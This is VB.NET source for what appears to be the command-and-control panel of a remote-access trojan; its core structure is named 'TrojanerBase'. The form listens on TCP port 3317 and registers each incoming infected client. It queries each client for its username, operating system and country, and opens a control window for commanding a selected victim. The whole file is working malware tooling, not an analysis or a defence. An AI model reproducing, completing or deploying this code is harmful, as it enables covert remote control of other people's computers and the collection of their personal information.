Imports System.Net.Sockets
Imports System.Net

Public Class Form1

    Structure TrojanerBase
        Public client As TcpClient
        Public w As IO.StreamWriter
        Public r As IO.StreamReader
        Public number As Integer
    End Structure

    Public Server As New List(Of TrojanerBase)
    Public ServerNumbers As Integer = 0

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Dim l As New TcpListener(3317)
        l.Start()
        While True
            Dim client As TcpClient = l.AcceptTcpClient
            Dim w As New IO.StreamWriter(client.GetStream)
            Dim r As New IO.StreamReader(client.GetStream)
            Dim t As New TrojanerBase
            t.client = client
            t.r = r
            t.w = w
            t.number = ServerNumbers
            ServerNumbers = ServerNumbers + 1
            Server.Add(t)
            Me.Invoke(New delegate_refresh(AddressOf refresh))
        End While
    End Sub

    Public Delegate Sub delegate_refresh()
    Public Sub refresh()
        ListView1.Items.Clear()
        'Try
        'My.Computer.Audio.Play(My.Resources.connected, AudioPlayMode.Background)
        For Each t As TrojanerBase In Server
            'Try
            Dim lvi As ListViewItem = ListView1.Items.Add(t.number)
            Dim ipport() As String = t.client.Client.RemoteEndPoint.ToString().Split(":")

            t.w.WriteLine("getlistinfos")
            t.w.Flush()
            Dim gett As String = t.r.ReadLine()
            Dim os As String = b(gett.Split("|")(0))
            Dim land As String = b(gett.Split("|")(1))
            Dim username As String = b(gett.Split("|")(2))

            lvi.SubItems.Add(username)
            lvi.SubItems.Add(ipport(0))
            lvi.SubItems.Add(ipport(1))
            lvi.SubItems.Add(os)
            lvi.SubItems.Add(GetPing(ipport(0)))
            lvi.SubItems.Add(land)
            'Catch ex As Exception
            'Server.Remove(t)
            'End Try
        Next
        'Catch ex As Exception
        'End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub

    Function GetPing(ByVal _s As String) As String
        Dim objPingHost As New clsPing()
        Dim lngPingReply As Long
        objPingHost.TimeOut = 5000
        objPingHost.DataSize = 32
        objPingHost.Host = Trim(_s)
        lngPingReply = objPingHost.Ping()
        Return lngPingReply
    End Function

    Private Sub ListView1_Click(sender As Object, e As EventArgs) Handles ListView1.Click
        Dim number As Integer = ListView1.SelectedItems.Item(0).Text
        Dim t As TrojanerBase
        For Each g_T As TrojanerBase In Server
            If g_T.number = number Then
                t = g_T
            End If
        Next
        Dim f As New Controll
        f.Number = number
        f.Connection = t
        f.Show()
    End Sub

    Public Function c(ByVal text As String) As String
        Return text.Replace("|", "<strich>")
    End Function

    Public Function b(ByVal text As String) As String
        Return text.Replace("<strich>", "|")
    End Function

End Class
